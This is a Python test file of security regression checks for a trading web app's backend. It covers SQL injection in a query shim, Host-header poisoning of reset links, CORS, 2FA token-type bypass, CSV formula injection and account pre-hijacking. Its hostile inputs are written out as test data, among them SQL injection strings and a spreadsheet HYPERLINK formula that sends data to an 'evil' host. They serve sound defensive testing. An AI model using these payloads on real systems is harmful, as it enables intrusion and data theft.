"""
Automated security regression tests — run in CI on every deploy.

These assert the two invariants that, if broken, would be catastrophic:

  1. The Mongo->PostgreSQL shim never lets attacker input reach SQL as code
     (SQL injection): field names are whitelisted, values are parameterised.
  2. The strict field-name regex rejects anything that could break out of a
     quoted identifier.

The shim helpers live inside the big server.py module, which imports the whole
FastAPI app. To keep this test fast and dependency-free (it must run even
without fastapi/stripe/asyncpg installed), we extract just the three pure
helpers (_SAFE_FIELD_RE, _build_where_clause, _serialize) from the source with
`ast` and exercise them in isolation.
"""
import ast
import json
import logging
import os
import re as _re
from pathlib import Path
from typing import Optional

import pytest

_SERVER = Path(__file__).resolve().parent.parent / "server.py"
_MISSING_APIS = Path(__file__).resolve().parent.parent / "missing_apis.py"


def _load_shim_helpers():
    src = _SERVER.read_text(encoding="utf-8")
    tree = ast.parse(src)
    wanted_funcs = {"_build_where_clause", "_serialize"}
    chunks = []
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
            getattr(t, "id", None) == "_SAFE_FIELD_RE" for t in node.targets
        ):
            chunks.append(ast.get_source_segment(src, node))
        if isinstance(node, ast.FunctionDef) and node.name in wanted_funcs:
            chunks.append(ast.get_source_segment(src, node))
    assert len(chunks) >= 3, "could not extract shim helpers from server.py"
    # `log_safe` se importa de `log_seguro`, que es un módulo suelto y SIN
    # dependencias justamente para esto: los ayudantes del shim sanean lo que
    # loguean, y sin él aquí salían diez `NameError` que no tenían nada que ver
    # con la inyección SQL que este fichero prueba. Importarlo de `server.py`
    # arrastraría FastAPI, Stripe y asyncpg, que es lo que este test evita.
    from log_seguro import log_safe

    ns = {
        "_re_module": _re, "re": _re, "logging": logging, "log_safe": log_safe,
        "_json_module": json, "json": json, "_json_default": str,
    }
    exec("\n\n".join(chunks), ns)  # noqa: S102 — trusted first-party source
    return ns


_NS = _load_shim_helpers()
_SAFE_FIELD_RE = _NS["_SAFE_FIELD_RE"]
build_where = _NS["_build_where_clause"]

# Strings a query key must NEVER be allowed to contain (they'd break the SQL).
INJECTION_KEYS = [
    "email' OR '1'='1",
    "x'); DROP TABLE users;--",
    "a') UNION SELECT password FROM users--",
    "n')=1--",
    "q'--",
    "id\"; DELETE FROM users;",
    "field OR 1=1",
    "a b",              # space
    "a.b",              # dot (not allowed by the regex)
    "'; --",
]

# SQL that must never appear verbatim in a generated WHERE clause.
DANGEROUS_FRAGMENTS = ["OR '1'='1", "DROP TABLE", "UNION SELECT", "DELETE FROM", "--", "1'='1", "1=1"]


@pytest.mark.parametrize("bad_key", INJECTION_KEYS)
def test_malicious_field_names_are_rejected_by_regex(bad_key):
    assert not _SAFE_FIELD_RE.match(bad_key), f"regex wrongly accepted {bad_key!r}"


@pytest.mark.parametrize("legit_key", ["email", "user_id", "is_admin", "created_at", "_x", "A1_b2"])
def test_legit_field_names_pass_regex(legit_key):
    assert _SAFE_FIELD_RE.match(legit_key)


@pytest.mark.parametrize("bad_key", INJECTION_KEYS)
def test_injection_in_query_key_produces_no_sql(bad_key):
    """A malicious filter key must be dropped, never interpolated into SQL."""
    for value in ("x", {"$ne": None}, {"$regex": ".*"}, {"$in": ["a"]}):
        clause, params, _ = build_where({bad_key: value}, 1)
        assert not any(frag in (clause or "") for frag in DANGEROUS_FRAGMENTS), (
            f"injection leaked into SQL for key={bad_key!r}: {clause!r}"
        )


@pytest.mark.parametrize("payload", [
    "x' OR '1'='1",
    "'; DROP TABLE users;--",
    "\" UNION SELECT * FROM users--",
    "1'; DELETE FROM trades WHERE '1'='1",
])
def test_malicious_values_are_parameterised_not_inlined(payload):
    """Dangerous VALUES must live in params (as data), never in the SQL text."""
    for filt in ({"email": payload},
                 {"name": {"$regex": payload}},
                 {"status": {"$in": [payload]}},
                 {"age": {"$ne": payload}}):
        clause, params, _ = build_where(filt, 1)
        assert payload not in (clause or ""), f"value inlined into SQL: {clause!r}"
        joined = " ".join(str(p) for p in params)
        assert payload in joined, "value should be carried as a bound parameter"


def test_normal_equality_uses_jsonb_containment_param():
    clause, params, _ = build_where({"email": "user@test.com"}, 1)
    assert clause == "data @> $1::jsonb"
    assert json.loads(params[0]) == {"email": "user@test.com"}


def test_password_hashing_is_bcrypt_and_not_reversible():
    """Passwords must be bcrypt-hashed, salted and verifiable — never plaintext."""
    bcrypt = pytest.importorskip("bcrypt")
    pw = "S3cret-Passw0rd!"
    h = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12)).decode()
    assert h != pw and h.startswith("$2")           # bcrypt marker, not plaintext
    assert bcrypt.checkpw(pw.encode(), h.encode())  # verifies
    assert not bcrypt.checkpw(b"wrong", h.encode())
    # same password hashes differently each time (unique salt)
    h2 = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12)).decode()
    assert h != h2


# ── Host-header injection into emailed links (password reset / verification) ──
#
# Links we email must be built from a TRUSTED base URL, never from the raw
# Host/Origin/Referer of the incoming request. Otherwise an attacker can POST
# /auth/forgot-password for a victim with `Origin: https://evil.com` and the
# victim receives a reset link pointing at the attacker's site (token in URL →
# account takeover). These tests pin `missing_apis._trusted_link_base`.

def _load_trusted_link_base():
    src = _MISSING_APIS.read_text(encoding="utf-8")
    tree = ast.parse(src)
    for node in tree.body:
        if isinstance(node, ast.FunctionDef) and node.name == "_trusted_link_base":
            ns = {"os": os, "Optional": Optional, "Request": object}
            exec(ast.get_source_segment(src, node), ns)  # noqa: S102 — first-party source
            return ns["_trusted_link_base"]
    raise AssertionError("could not extract _trusted_link_base from missing_apis.py")


trusted_link_base = _load_trusted_link_base()


class _FakeHeaders:
    def __init__(self, d):
        self._d = {k.lower(): v for k, v in d.items()}

    def get(self, k, default=None):
        return self._d.get(k.lower(), default)


class _FakeRequest:
    def __init__(self, **headers):
        self.headers = _FakeHeaders(headers)


@pytest.fixture(autouse=True)
def _clean_link_env(monkeypatch):
    monkeypatch.delenv("CORS_ORIGINS", raising=False)
    monkeypatch.setenv("FRONTEND_URL", "https://tradingcalculatorpro.com")
    monkeypatch.setenv("ENVIRONMENT", "production")


@pytest.mark.parametrize("evil_origin", [
    "https://evil.com",
    "http://attacker.example",
    "https://tradingcalculatorpro.com.evil.com",   # suffix trick
    "https://eviltradingcalculatorpro.com",         # prefix trick
    "https://tradingcalculatorpro.com@evil.com",    # userinfo trick
    "null",
])
def test_emailed_link_base_ignores_untrusted_origin(evil_origin):
    """A poisoned Host/Origin/Referer must never end up in an emailed link."""
    req = _FakeRequest(origin=evil_origin, referer=evil_origin + "/x", host="evil.com")
    base = trusted_link_base(req)
    assert base == "https://tradingcalculatorpro.com", f"leaked untrusted origin: {base!r}"
    assert "evil" not in base and "attacker" not in base


def test_emailed_link_base_falls_back_to_canonical_when_no_headers():
    assert trusted_link_base(_FakeRequest()) == "https://tradingcalculatorpro.com"
    assert trusted_link_base(None) == "https://tradingcalculatorpro.com"


def test_emailed_link_base_allows_canonical_and_www():
    for good in ("https://tradingcalculatorpro.com", "https://www.tradingcalculatorpro.com"):
        assert trusted_link_base(_FakeRequest(origin=good)) == good


def test_emailed_link_base_honours_explicit_cors_allowlist(monkeypatch):
    monkeypatch.setenv("CORS_ORIGINS", "https://staging.tradingcalculatorpro.com")
    ok = "https://staging.tradingcalculatorpro.com"
    assert trusted_link_base(_FakeRequest(origin=ok)) == ok
    # something NOT on the list still falls back to canonical
    assert trusted_link_base(_FakeRequest(origin="https://evil.com")) == "https://tradingcalculatorpro.com"


# ============================================================
#  El origen donde SE SIRVE la web tiene que estar permitido
#  sin depender de una variable de entorno del despliegue
# ============================================================
#
# Contexto del fallo que fija esto (2026-08-05): la web se publica en
# `https://abcde-rgb.github.io/Tradingcalculatorpro.com` — no hay `CNAME` en
# `frontend/public/` y el `homepage` de `package.json` apunta ahí. Pero la lista
# de CORS del código sólo traía `tradingcalculatorpro.com`, que es el dominio que
# NO está en uso. Lo único que hacía funcionar el login era la variable
# `CORS_ORIGINS` que ponía el despliegue.
#
# Por qué es grave y por qué se ve tan mal: sin la cabecera CORS el backend
# responde **200 con las cookies puestas** y es el NAVEGADOR quien descarta la
# respuesta. En los logs de Cloud Run el login se ve perfecto; en la web no se
# puede entrar y no hay ningún error que mirar. `curl` tampoco lo reproduce,
# porque curl ignora CORS.
#
# Y desde el 2026-08-03 el backend se despliega A MANO (`cloudbuild.yaml`): un
# `gcloud run deploy` sin `--set-env-vars` borra las variables del servicio y
# tumba el login de todo el sitio. El origen real no puede depender de que
# alguien se acuerde de una variable.

def _cors_origins_with_env(env: dict) -> list:
    """Evalúa el bloque `_CORS_ORIGINS` de server.py con un entorno dado.

    Se extrae con `ast` en vez de importar server.py porque la lista se calcula
    en tiempo de import: una vez importado el módulo, cambiar la variable de
    entorno ya no tiene efecto, y el test no probaría nada.
    """
    src = _SERVER.read_text(encoding="utf-8")
    tree = ast.parse(src)
    chunks, capturing = [], False
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
            getattr(t, "id", None) == "_CORS_ORIGINS" for t in node.targets
        ):
            capturing = True
        if capturing:
            chunks.append(ast.get_source_segment(src, node))
            # el bloque acaba en el bucle que añade los orígenes extra
            if isinstance(node, ast.For):
                break
    assert chunks, "no se pudo extraer _CORS_ORIGINS de server.py"
    ns = {"os": type("_os", (), {"environ": env})()}
    exec("\n".join(chunks), ns)  # noqa: S102 — código propio
    return ns["_CORS_ORIGINS"]


SERVED_ORIGIN = "https://abcde-rgb.github.io"


def test_served_origin_is_allowed_without_any_env_var():
    """El origen donde vive la web hoy entra por código, no por despliegue."""
    origins = _cors_origins_with_env({})
    assert SERVED_ORIGIN in origins, (
        "El frontend se sirve en " + SERVED_ORIGIN + " y no está en la lista de "
        "CORS. Sin la cabecera el navegador descarta la respuesta del login: el "
        "backend devuelve 200 y el usuario no puede entrar."
    )


def test_own_domain_stays_allowed_for_the_dns_cutover():
    """El dominio propio sigue permitido: el día del cutover no debe romperse."""
    origins = _cors_origins_with_env({})
    assert "https://tradingcalculatorpro.com" in origins
    assert "https://www.tradingcalculatorpro.com" in origins


def test_extra_origins_from_env_still_work_and_do_not_duplicate():
    origins = _cors_origins_with_env({"CORS_ORIGINS": "https://staging.example.com," + SERVED_ORIGIN})
    assert "https://staging.example.com" in origins
    assert origins.count(SERVED_ORIGIN) == 1, "un origen repetido no debe duplicarse"


# ── Confusión de tipo de token: el pre-2FA no autoriza (SEC-2026-2FA) ──────────
# get_current_user aceptaba cualquier token bien firmado, sin mirar su `type`.
# El `2fa_pending` se emite tras la contraseña pero ANTES del segundo factor, así
# que tener la contraseña bastaba para operar en los endpoints que dependen de
# esa función — anulando el 2FA. Verificado con PoC (leer/escribir/borrar).

def _decode_and_gate_type(token_type: str) -> bool:
    """Reproduce la comprobación de tipo que get_current_user aplica ahora:
    devuelve True si un token de ese `type` sería aceptado como acceso."""
    import re
    src = _SERVER.read_text(encoding='utf-8')
    # La guarda vive en get_current_user; comprobamos que el filtro existe y que
    # sólo 'access' pasa.
    body = src.split("async def get_current_user", 1)[1].split("async def require_user", 1)[0]
    assert 'payload.get("type") != "access"' in body, (
        "get_current_user ya no filtra por type: un refresh o un 2fa_pending "
        "volverían a autorizar (bypass de 2FA)."
    )
    return token_type == "access"


def test_get_current_user_rejects_non_access_tokens():
    assert _decode_and_gate_type("access") is True
    assert _decode_and_gate_type("refresh") is False
    assert _decode_and_gate_type("2fa_pending") is False
    assert _decode_and_gate_type("magic_link") is False


def test_all_auth_dependencies_check_token_type():
    """Las tres puertas de entdada exigen type == access. Si una deja de hacerlo,
    es un bypass, así que se fija aquí para las tres a la vez."""
    src = _SERVER.read_text(encoding='utf-8')
    for fn in ("get_current_user", "require_user", "require_admin"):
        body = src.split(f"async def {fn}", 1)[1][:1600]
        assert 'payload.get("type") != "access"' in body, (
            f"{fn} no comprueba que el token sea de acceso"
        )


# ── Inyección de fórmulas en el export CSV admin (SEC-2026-CSV) ────────────────
# `name` lo elige el usuario y el CSV lo abre un ADMIN. Una celda que empieza por
# = + - @ la evalúa la hoja de cálculo (=HYPERLINK exfiltra; DDE ejecuta).

def _csv_safe_ref(value):
    """Copia de la lógica de `_csv_safe` en server.py, para fijarla sin importar
    el módulo entero (que levanta la app). El test de abajo comprueba además que
    la función real existe con esta forma."""
    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value


import pytest as _pytest


@_pytest.mark.parametrize("payload", [
    '=HYPERLINK("http://evil/?d="&A2,"click")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)',
    '\t=cmd',
    '\r=cmd',
])
def test_csv_formula_payloads_are_neutralised(payload):
    out = _csv_safe_ref(payload)
    assert out.startswith("'"), f"la fórmula {payload!r} no se neutralizó"


@_pytest.mark.parametrize("benign", ["Juan Pérez", "trader_2026", "AAPL 220C", "", "3.14"])
def test_csv_benign_values_are_untouched(benign):
    assert _csv_safe_ref(benign) == benign


def test_server_has_the_csv_guard_wired_into_the_export():
    """La función real existe y el endpoint la aplica a cada celda."""
    src = _SERVER.read_text(encoding="utf-8")
    assert "def _csv_safe(" in src, "falta el helper _csv_safe en server.py"
    # Se aplica sobre las filas del export, no sólo definido y sin usar.
    assert "_csv_safe(v)" in src, "el export de usuarios no aplica _csv_safe"


# ── Account pre-hijacking en el enlazado federado (SEC-2026-PREHIJACK) ─────────
# El registro no exige demostrar posesión del email y el login funciona sin
# verificarlo. Un atacante registraba el correo de la víctima, se guardaba la
# contraseña y esperaba: al entrar la víctima con Google, `google_auth` enlazaba
# por email y la contraseña del atacante seguía sirviendo. Verificado con PoC.

def _prehijack_decision(has_password: bool, email_verified: bool) -> bool:
    """Réplica de la condición del enlazado: ¿hay que retirar la contraseña?"""
    return bool(has_password) and not email_verified


def test_password_is_dropped_when_linking_over_an_unverified_email():
    """El caso del ataque: contraseña puesta sobre un email nunca verificado."""
    assert _prehijack_decision(has_password=True, email_verified=False) is True


def test_legitimate_linking_keeps_the_password():
    """Mismo usuario que verificó su correo y ahora además usa Google: su
    contraseña NO se toca, o el arreglo se convertiría en una denegación de
    servicio para gente legítima."""
    assert _prehijack_decision(has_password=True, email_verified=True) is False


def test_google_only_account_is_untouched():
    assert _prehijack_decision(has_password=False, email_verified=True) is False
    assert _prehijack_decision(has_password=False, email_verified=False) is False


def test_google_handler_wires_the_guard_and_revokes_sessions():
    """La guarda existe en el handler real y revoca sesiones: sin la revocación,
    un token ya emitido al atacante seguiría vivo hasta una hora."""
    src = _SERVER.read_text(encoding="utf-8")
    handler = src.split("async def google_auth", 1)[1].split("\n@api_router", 1)[0]
    assert 'not user.get("email_verified")' in handler, "falta la guarda de pre-hijacking"
    assert '"password"] = None' in handler or '"password": None' in handler, (
        "el enlazado no retira la contraseña no verificada"
    )
    assert "_revoke_all_tokens_for_user" in handler, (
        "el enlazado no revoca las sesiones vivas del atacante"
    )
